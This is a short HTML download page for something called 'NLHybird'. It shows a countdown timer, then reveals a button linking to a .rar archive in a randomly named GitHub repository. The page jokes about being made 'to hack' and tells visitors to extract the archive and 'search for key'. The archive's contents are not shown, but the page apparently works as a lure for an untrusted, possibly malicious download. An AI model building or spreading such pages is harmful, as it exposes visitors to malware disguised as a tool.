<!DOCTYPE html>
<html>
<head>
    <title>cccc</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background: linear-gradient(270deg, #6345a5, #070707);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            text-align: center; /* Center text for the entire body */
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h1 {
            font-size: 48px; /* Larger font size for h1 */
        }

        h2 {
            font-size: 36px; /* Larger font size for h2 */
        }

        p {
            font-size: 24px; /* Larger font size for paragraph */
        }

        #download-button {
            display: none; /* Hide the button initially */
            width: 150px; /* Set a fixed width */
            height: 50px; /* Set a fixed height */
            font-size: 16px;
            color: white;
            background-color: #333;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 10px; /* Rounded corners */
            transition: background-color 0.3s, transform 0.3s; /* Transition for background and transform */
        }

        #download-button:hover {
            background-color: #555; /* Change background color on hover */
            transform: scale(1.05); /* Slightly increase size on hover */
        }

        #timer {
            font-size: 17px; /* Timer font size */
            margin-top: 40px; /* Increased spacing above the timer */
        }
    </style>
</head>
<body>

    <h1>NLHybird</h1>
    <p>I made this site to hack.. i mean for somthing.</p>

    <h2>Steps to download</h2>
    <ul>
        <li>Press "Download"</li>
        <li>extrac the file</li>
        <li>Search for key</li>
    </ul>

    <div id="timer">15 seconds remaining</div>
    <a id="download-link" href="https://raw.githubusercontent.com/0h98fw40h9w0j9i4ef0jiwefj9efw-jwefwe0fw/jmdfghtiogjerdmt0poigrejmop/main/NLHybrid.rar" download>
        <button id="download-button">Download</button>
    </a>

    <script>
        let countdown = 15; // Set countdown timer
        const timerElement = document.getElementById('timer');
        const downloadButton = document.getElementById('download-button');

        const interval = setInterval(function() {
            countdown--;
            timerElement.textContent = `${countdown} seconds remaining`;

            if (countdown <= 0) {
                clearInterval(interval);
                downloadButton.style.display = 'block'; // Show button
                timerElement.textContent = ''; // Clear timer text
            }
        }, 1000); // Update every second
    </script>

</body>
</html>
